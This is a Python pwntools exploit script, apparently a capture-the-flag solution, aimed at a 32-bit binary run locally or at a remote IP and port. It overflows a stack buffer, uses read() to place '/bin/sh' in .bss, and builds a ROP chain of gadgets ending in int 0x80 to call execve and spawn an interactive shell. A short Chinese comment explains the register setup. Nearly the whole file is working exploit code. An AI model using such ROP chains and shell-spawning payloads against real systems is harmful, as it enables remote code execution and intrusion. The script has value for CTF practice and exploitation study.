# -*- coding: utf-8 -*-
#!/usr/bin/env python2
from pwn import *
context.log_level = 'debug'
context.arch = 'i386'
LOCAL = 1
main_addr = 0x0804887C
int80_gad_addr = 0x0806cbb5
#0x3a+4+4
read_addr = 0x0806D510
write_addr= 0x0806D580
bss_addr = 0x080ECA35
xor_eax_eax_ret = 0x080493a3
pop_ebx_ret = 0x080481c9
pop_ecx_ret = 0x080df1b9
pop_edx_ret = 0x0806efbb
add_al_ret = 0x080b4f19
mov_esp_ecx = 0x080b8c22
if LOCAL:
    p = process('./250')#,env=env)
    #p = process('filename',raw=False)
    #this for Windows10 subsystem
else:
    p = remote('60.191.205.81',2017)
def fuck(size,data):
    p.recvuntil('Size]')
    p.sendline(str(size))
    p.recvuntil('Data]')
    p.sendline(str(data))
def main():

    gdb.attach(p,"""
        b *0x08048986
        c
    """)


    payload = 'A'*(0x3a+4) +p32(read_addr) + p32(main_addr) + p32(0) + p32(bss_addr) + p32(8)
    fuck(0x100,payload)
    p.send("/bin/sh\0")
    sleep(2)
    payload = 'A'*(0x3a+4) +p32(read_addr) + p32(main_addr) + p32(0) + p32(bss_addr+10) + p32(8)
    fuck(0x100,payload)
    p.send(p32(bss_addr))
    sleep(2)

    '''
    这里要注意参数execve
    ebx="/bin/sh"的地址
    ecx=指向"/bin/sh"的地址指针
    eax=0xb  这个是调用int 80的号码
    '''
    payload = 'A'*(0x3a+4) + p32(xor_eax_eax_ret)+p32(pop_ebx_ret)+p32(bss_addr)
    payload += p32(pop_ecx_ret) + p32(bss_addr+10)
    payload += p32(pop_edx_ret) + p32(0)
    payload += p32(add_al_ret) * 0xb
    payload += p32(int80_gad_addr)
    fuck(0x100,payload)

    p.interactive()
if __name__ == '__main__':
    main()
